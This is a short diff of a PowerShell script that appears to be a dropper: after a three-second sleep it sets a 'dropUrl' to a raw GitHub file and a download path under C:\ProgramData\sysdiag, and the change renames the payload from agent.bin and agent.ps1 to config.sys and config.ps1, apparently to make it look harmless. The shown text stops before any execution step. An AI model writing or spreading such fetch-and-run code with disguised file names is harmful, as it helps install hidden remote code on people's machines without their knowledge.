@@ -1,9 +1,9 @@
 # UID = 2848516423
 
 Start-Sleep 3
-$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/agent.bin"
-$destPath = "C:\ProgramData\sysdiag\agent.bin"
-$execPath = "C:\ProgramData\sysdiag\agent.ps1"
+$dropUrl = "https://raw.githubusercontent.com/flocktrack/sysdiag-utils/main/config.sys"
+$destPath = "C:\ProgramData\sysdiag\config.sys"
+$execPath = "C:\ProgramData\sysdiag\config.ps1"
 
 $folder = Split-Path $destPath
 if (-not (Test-Path $folder)) {
